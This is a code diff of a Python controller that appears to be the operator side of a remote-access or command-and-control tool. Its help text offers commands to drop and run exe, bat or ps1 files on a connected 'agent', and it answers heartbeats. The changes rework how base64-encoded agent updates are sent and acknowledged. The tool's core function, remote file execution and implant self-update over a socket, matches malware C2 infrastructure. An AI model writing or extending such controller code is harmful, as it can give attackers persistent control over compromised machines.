@@ -19,7 +19,7 @@ HELP_TEXT = """Commands:
   event:<name>               Fire a plugin event
   execute:<ext>:<path>       Drop and run a file on the agent
                              ext: exe | bat | ps1
-  update:<path>              Update the agent; it is staged as <agent>_update.exe
+  update:<path>              Send the file bytes; the agent chooses <agent>_update.exe
   <path>                     Shorthand for load:<path>"""
 
 def read_line(s):
@@ -49,7 +49,7 @@ def wait_result(s):
         if line == "HB":
             s.sendall(b"PONG\n")
             continue
-        if line.startswith("ACK:UPDATE:"):
+        if line == "ACK:UPDATE:" or line == "ACK:UPDATE":
             return line
         print(line)
         if line.startswith("ACK:") or line.startswith("ERR:"):
@@ -64,10 +64,8 @@ def plugin_cmd(path):
 
 def update_cmd(path):
     with open(path, "rb") as f:
-        data = f.read()
-    name = os.path.basename(path)
-    b64 = base64.b64encode(data).decode()
-    return f"CMD:UPDATE:{name}:{b64}"
+        b64 = base64.b64encode(f.read()).decode()
+    return f"CMD:UPDATE:{b64}"
 
 def execute_cmd(ext, path):
     with open(path, "rb") as f:
@@ -182,7 +180,7 @@ def main():
                 if not result:
                     return
                 if lc.startswith("update:"):
-                    if result.startswith("ACK:UPDATE:"):
+                    if result in {"ACK:UPDATE", "ACK:UPDATE:"}:
                         print("update handoff accepted; waiting for successor")
                         conn.close()
                         conn = accept_agent(server, timeout=30)
